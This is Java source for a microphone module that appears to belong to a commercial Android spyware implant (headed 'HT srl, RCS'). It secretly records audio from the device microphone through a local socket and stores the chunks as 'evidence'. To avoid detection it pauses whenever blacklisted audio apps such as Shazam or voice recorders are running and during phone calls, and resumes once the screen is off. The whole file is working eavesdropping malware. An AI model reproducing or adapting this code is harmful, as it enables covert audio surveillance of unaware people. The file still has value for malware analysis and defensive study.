/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : MicAgent.java
 * Created      : Apr 18, 2011
 * Author		: zeno
 * *******************************************/

package com.android.dvci.module;

import android.content.Context;
import android.media.AudioManager;
import android.media.MediaRecorder;
import android.media.MediaRecorder.OnErrorListener;
import android.media.MediaRecorder.OnInfoListener;
import android.net.LocalServerSocket;
import android.net.LocalSocket;
import android.net.LocalSocketAddress;

import com.android.dvci.Call;
import com.android.dvci.ProcessInfo;
import com.android.dvci.ProcessStatus;
import com.android.dvci.Standby;
import com.android.dvci.StateRun;
import com.android.dvci.Status;
import com.android.dvci.auto.Cfg;
import com.android.dvci.conf.ConfModule;
import com.android.dvci.evidence.EvidenceBuilder;
import com.android.dvci.evidence.EvidenceType;
import com.android.dvci.file.AutoFile;
import com.android.dvci.interfaces.Observer;
import com.android.dvci.listener.ListenerCall;
import com.android.dvci.listener.ListenerProcess;
import com.android.dvci.listener.ListenerStandby;
import com.android.dvci.manager.ManagerModule;
import com.android.dvci.util.ByteArray;
import com.android.dvci.util.Check;
import com.android.dvci.util.DataBuffer;
import com.android.dvci.util.DateTime;
import com.android.dvci.util.Utils;
import com.android.mm.M;

import java.io.IOException;
import java.io.InputStream;
import java.util.HashSet;
import java.util.Set;

/**
 * The Class MicAgent. 8000KHz, 16bit
 *
 * @author zeno
 * @ref: http://developer.android.com/reference/android/media/MediaRecorder.html
 */
public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorListener, OnInfoListener {

	private static final String TAG = "ModuleMic"; //$NON-NLS-1$
	private static final long MIC_PERIOD = 5000;
	// #!AMR[space]
	public static final byte[] AMR_HEADER = new byte[]{35, 33, 65, 77, 82, 10};
	private static final int SUSPEND_CALL = 0;
	private static StandByObserver standbyObserver;

	int amr_sizes[] = {12, 13, 15, 17, 19, 20, 26, 31, 5, 6, 5, 5, 0, 0, 0, 0};

	/**
	 * The recorder.
	 */
	MediaRecorder recorder;

	// Object stateLock = new Object();

	private int numFailures;
	private long fId;

	private LocalSocket receiver;
	private LocalServerSocket lss;
	private LocalSocket sender;
	private InputStream is;
	private String socketname;

	boolean phoneListening;
	private Observer<ProcessInfo> processObserver;

	public Set<String> blacklist = new HashSet<String>();
	private boolean allowResume = true;

	public ModuleMic() {
		super();
		resetBlacklist();
	}

	public synchronized void resetBlacklist() {
		blacklist.clear();
		addBlacklist(M.e("shazam"));
		addBlacklist(M.e("com.vlingo"));
		addBlacklist(M.e("soundrecorder"));
		addBlacklist(M.e("voicerecorder"));
		addBlacklist(M.e("voicesearch"));
	}

	public synchronized void addBlacklist(String black) {
		blacklist.add(black);
	}

	public static ModuleMic self() {
		return (ModuleMic) ManagerModule.self().get(M.e("mic"));
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#parse(byte[])
	 */
	@Override
	public boolean parse(ConfModule conf) {
		setPeriod(MIC_PERIOD);
		setDelay(MIC_PERIOD);
		return true;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#begin()
	 */
	@Override
	public void actualStart() {
		try {

			if (Cfg.DEBUG) {
				Check.requires(status == StateRun.STARTING, "inconsistent status"); //$NON-NLS-1$
			}

			if (standbyObserver == null) {
				standbyObserver = new StandByObserver(this);
			}


			if (canRecordMic()) {
				startRecord();

				if (Cfg.DEBUG) {
					Check.log(TAG + "started");//$NON-NLS-1$
				}
			}else{
				if (Cfg.DEBUG) {
					Check.log(TAG + "cannot start");//$NON-NLS-1$
				}
			}



		} catch (final IllegalStateException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " (begin) Error: " + e.toString());//$NON-NLS-1$
			}
		} catch (IOException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}
		}
	}

	private void startRecord() throws IOException {
		addPhoneListener();
		if (Cfg.DEBUG) {
			Check.asserts(standbyObserver != null, " (actualStart) Assert failed, null standbyObserver");
		}
		ListenerStandby.self().attach(standbyObserver);
		startRecorder();
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#end()
	 */
	@Override
	public void actualStop() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (end)");//$NON-NLS-1$
		}
		if (Cfg.DEBUG) {
			Check.requires(status == StateRun.STOPPING, "state not STOPPING"); //$NON-NLS-1$
		}
		if (Cfg.DEBUG) {
			Check.asserts(standbyObserver != null, " (actualStop) Assert failed, null standbyObserver");
		}

		removePhoneListener();
		ListenerStandby.self().detach(standbyObserver);
		saveRecorderEvidence();
		stopRecorder();

		if (Cfg.DEBUG) {
			Check.log(TAG + " (ended)");//$NON-NLS-1$
		}

	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.ThreadBase#go()
	 */
	@Override
	public void actualGo() {
		if (Cfg.DEBUG) {
			Check.requires(status == StateRun.STARTED, "inconsistent status"); //$NON-NLS-1$
		}

		if (recorder == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (actualGo), recorder not ready");
			}
			if (canRecordMic()) {
				try {
					startRecord();
				} catch (IOException e) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (actualGo), cannot start record: " + e);
					}
				}
			}
			return;
		}

		final int amp = recorder.getMaxAmplitude();
		if (amp != 0) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (actualGo): max amplitude=" + amp);//$NON-NLS-1$
			}
		}

		if (numFailures < 10) {
			try {
				saveRecorderEvidence();
			} catch (Exception ex) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (actualGo) Error: " + ex);
				}
			}
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + "numFailures: " + numFailures);//$NON-NLS-1$
			}
			stopThread();
		}

		if (Status.self().crisisMic()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "crisis!");//$NON-NLS-1$
			}
			suspend();
		}

	}

	private void addPhoneListener() {
		if (!phoneListening) {
			ListenerCall.self().attach(this);
			phoneListening = true;
		}

		if (processObserver == null) {
			processObserver = new ProcessObserver(this);
		}
		ListenerProcess.self().attach(processObserver);
	}

	private void removePhoneListener() {
		if (phoneListening) {
			ListenerCall.self().detach(this);
			phoneListening = false;
		}

		ListenerProcess.self().detach(processObserver);
	}

	@Override
	public void notifyProcess(ProcessInfo b) {

		AudioManager audioManager = (AudioManager) Status.getAppContext().getSystemService(Context.AUDIO_SERVICE);
		boolean headset = audioManager.isWiredHeadsetOn();
		if (Cfg.DEBUG) {
			Check.log(TAG + " (notifyProcess) headset: " + headset);
		}

		for (String bl : blacklist) {
			if (b.processInfo.contains(bl)) {
				if (b.status == ProcessStatus.START) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (notifyProcess) blacklist started, " + b.processInfo);
					}
					suspend();
				} else {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (notifyProcess) blacklist stopped, " + b.processInfo);
					}
					resume();
				}
			}
		}
	}

	int index = 0;
	byte[] unfinished = null;
	private boolean callOngoing;

	private synchronized void saveRecorderEvidence() {

		if (recorder == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (saveRecorderEvidence) Error: recorder is null");

			}
			numFailures += 1;
			return;
		}

		byte[] chunk = getAvailable();
		byte[] data = null;
		if (chunk != null && chunk.length > 0) {

			// data contiene il chunk senza l'header
			if (ByteArray.equals(chunk, 0, AMR_HEADER, 0, AMR_HEADER.length)) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (saveRecorderEvidence): remove header");
				}
				int offset = AMR_HEADER.length;
				data = ByteArray.copy(chunk, offset, chunk.length - offset);
				if (Cfg.MICFILE) {
					AutoFile file = new AutoFile("/mnt/sdcard/record." + index + ".amr");
					index++;
					file.write(chunk);
				}
			} else if (unfinished != null && unfinished.length > 0) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (saveRecorderEvidence): copy bias=" + ByteArray.byteArrayToHex(unfinished));
				}
				data = ByteArray.concat(unfinished, unfinished.length, chunk, chunk.length);
				if (Cfg.MICFILE) {
					AutoFile file = new AutoFile("/mnt/sdcard/record." + index + ".amr");
					index++;
					file.write(data);
				}
			} else {
				// if (Cfg.DEBUG) {
				// Check.log(TAG +
				// " (saveRecorderEvidence): plain chunk, no bias");
				// }
				data = chunk;
				if (Cfg.MICFILE) {
					AutoFile file = new AutoFile("/mnt/sdcard/record." + index + ".amr");
					index++;
					file.write(data);
				}
			}

			// capire quale parte del chunk e' spezzata.
			/* Find the packet size */
			int pos = 0;
			int chunklen = 0;
			do {
				if (pos >= data.length) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (saveRecorderEvidence) Error: strange pos");
					}
					numFailures += 1;
					return;
				}
				chunklen = amr_sizes[(data[pos] >> 3) & 0x0f];
				if (chunklen == 0) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (saveRecorderEvidence) Error: zero len amr chunk, pos: " + pos);
					}
				}
				pos += chunklen + 1;
				if (false && Cfg.DEBUG) {
					Check.log(TAG + " (saveRecorderEvidence): pos = " + pos + " chunklen = " + chunklen);
				}
			} while (pos < data.length);

			int unfinishedLen = 0;
			int unfinishedPos = 0;

			if (Cfg.DEBUG) {
				Check.log(TAG + " (saveRecorderEvidence), data.length+1: " + (data.length + 1) + " pos: " + pos);
			}

			if (pos > data.length + 1) {

				// portion of microchunk to be saved for the next time

				unfinishedLen = (chunklen - (pos - data.length) + 1) % chunklen;
				unfinishedPos = pos - chunklen - 1;

				if (Cfg.DEBUG) {
					Check.log(TAG + " (saveRecorderEvidence): unfinishedLen = " + unfinishedLen + " unfPos: "
							+ unfinishedPos + " chunklen: " + chunklen);
				}

				unfinished = ByteArray.copy(data, unfinishedPos, data.length - unfinishedPos);
				if (unfinished.length > 0) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (saveRecorderEvidence): removing unfinished from data");
					}
					data = ByteArray.copy(data, 0, unfinishedPos);
				}
			}

			if (data.length > 0) {
				EvidenceBuilder.atomic(EvidenceType.MIC, getAdditionalData(), data);
			}

		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " zero chunk ");//$NON-NLS-1$
			}
			numFailures += 1;
		}
	}

	private byte[] getAvailable() {
		byte[] ret = null;
		try {
			if (receiver.isBound() && receiver.isConnected()) {
				if (is == null) {
					is = receiver.getInputStream();
				}

				final int available = is.available();
				if (Cfg.DEBUG) {
					Check.log(TAG + " (getAvailable): " + available);//$NON-NLS-1$
				}
				ret = new byte[available];
				is.read(ret);
			}
		} catch (final IOException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(e);//$NON-NLS-1$
			}
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getAvailable) Error: " + e);//$NON-NLS-1$
			}
		}

		return ret;
	}

	/**
	 * Start recorder.
	 *
	 * @throws IllegalStateException the illegal state exception
	 * @throws IOException           Signals that an I/O exception has occurred.
	 */
	private synchronized void startRecorder() throws IllegalStateException, IOException {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (startRecorder)");//$NON-NLS-1$
		}
		numFailures = 0;
		unfinished = null;

		final DateTime dateTime = new DateTime();
		fId = dateTime.getFiledate();

		createSockets();
		recorder = new MediaRecorder();
		recorder.setOnErrorListener(this);
		recorder.setOnInfoListener(this);
		recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
		recorder.setOutputFormat(MediaRecorder.OutputFormat.RAW_AMR);
		recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
		// dalla versione API 10, supporta anche AMR_WB

		/*
		 * recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
		 * recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
		 * recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
		 * recorder.setAudioEncodingBitRate(16);
		 * recorder.setAudioSamplingRate(44100);
		 */

		recorder.setOutputFile(sender.getFileDescriptor());

		recorder.prepare();
		recorder.start(); // Recording is now started

	}

	private void createSockets() {
		receiver = new LocalSocket();

		try {
			socketname = Long.toHexString(Utils.getRandom());
			lss = new LocalServerSocket(socketname);
			receiver.connect(new LocalSocketAddress(socketname));
			receiver.setReceiveBufferSize(500000);
			receiver.setSendBufferSize(500000);
			sender = lss.accept();
			sender.setReceiveBufferSize(500000);
			sender.setSendBufferSize(500000);
		} catch (final IOException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " (createSockets) Error: " + e);//$NON-NLS-1$
			}
		}
	}

	private void deleteSockets() {
		try {
			is.close();
			is = null;
			sender.close();
			receiver.close();
			lss.close();
		} catch (final IOException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(e);//$NON-NLS-1$
			}
			if (Cfg.DEBUG) {
				Check.log(TAG + " (deleteSockets) Error: " + e);//$NON-NLS-1$
			}
		}
	}

	// http://sipdroid.googlecode.com/svn/trunk/src/org/sipdroid/sipua/ui/VideoCamera.java

	/**
	 * Stop recorder.
	 */
	private synchronized void stopRecorder() {

		if (Cfg.DEBUG) {
			Check.log(TAG + " (stopRecorder)");//$NON-NLS-1$
		}

		if (recorder != null) {
			recorder.setOnErrorListener(null);
			recorder.setOnInfoListener(null);

			try {
				recorder.stop();
			} catch (Exception ex) {
				if (Cfg.DEBUG) {
					Check.log(ex);
				}
			}
			recorder.reset(); // You can reuse the object by going back to
			// setAudioSource() step
			// recorder.release(); // Now the object cannot be reused
			getAvailable();
			deleteSockets();

			recorder.release();
			recorder = null;
		}

	}

	private byte[] getAdditionalData() {
		final int LOG_MIC_VERSION = 2008121901;
		final int LOG_AUDIO_CODEC_AMR = 0x01;
		final int sampleRate = 8000;

		final int tlen = 16;
		final byte[] additionalData = new byte[tlen];

		final DataBuffer databuffer = new DataBuffer(additionalData, 0, tlen);

		databuffer.writeInt(LOG_MIC_VERSION);
		databuffer.writeInt(sampleRate | LOG_AUDIO_CODEC_AMR);
		databuffer.writeLong(fId);

		if (Cfg.DEBUG) {
			Check.ensures(additionalData.length == tlen, "Wrong additional data name"); //$NON-NLS-1$
		}

		return additionalData;
	}

	public int notification(Call call) {
		if (call.isOngoing()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): call incoming, suspend");//$NON-NLS-1$
			}
			callOngoing = true;
			suspend();
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): ");//$NON-NLS-1$
			}
			callOngoing = false;
			resume();
		}

		return 1;
	}

	public int notification(Standby b) {
		if (b.isScreenOff()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification) standby, resume mic");
			}

			resume();
		} else {
			if (isForegroundBlacklist()) {
				suspend();
			}
		}
		return 0;
	}

	private boolean isForegroundBlacklist() {
		String foreground = Status.self().getForeground();
		for (String bl : blacklist) {
			if (foreground.contains(bl)) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (isForegroundBlacklist) found blacklist");
				}
				return true;
			}
		}
		return false;
	}

	@Override
	public synchronized void suspend() {
		if (!isSuspended()) {
			super.suspend();
			saveRecorderEvidence();
			stopRecorder();
			if (allowResume == false) {
				removePhoneListener();
				ListenerStandby.self().detach(standbyObserver);
			}
			if (Cfg.DEBUG) {
				Check.log(TAG + " (suspended)");//$NON-NLS-1$
			}
		}
	}

	private boolean canRecordMic() {
		if (!Status.crisisMic() && !callOngoing) {
			if (isForegroundBlacklist() && ListenerStandby.isScreenOn()) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (canRecordMic) can't resume because of blacklist");
				}
				return false;
			}

			if (ModuleCall.self() != null && ModuleCall.self().canRecord()) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (canRecordMic) can't switch on mic because call is available");
				}
				return false;
			}
			return true;
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (canRecordMic) crisis or call, cant rec");
		}
		return false;

	}

	@Override
	public synchronized void resume() {
		if (isSuspended() && allowResume && canRecordMic()) {

			try {
				startRecorder();
			} catch (final IllegalStateException e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				if (Cfg.DEBUG) {
					Check.log(TAG + " (resume) Error: " + e);//$NON-NLS-1$
				}
			} catch (final IOException e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				if (Cfg.DEBUG) {
					Check.log(TAG + " (resume) Error: " + e);//$NON-NLS-1$
				}
			}

			super.resume();

			if (Cfg.DEBUG) {
				Check.log(TAG + " (resumed)");//$NON-NLS-1$
			}
		}
	}

	public void onInfo(MediaRecorder mr, int what, int extra) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (onInfo): " + what);//$NON-NLS-1$
		}
	}

	public void onError(MediaRecorder mr, int what, int extra) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (onError) Error: " + what);//$NON-NLS-1$
		}

		suspend();
	}

	public void stop() {
		//final ManagerModule moduleManager = ManagerModule.self();
		//moduleManager.stop(M.e("mic"));

		allowResume = false;
		suspend();

	}
}
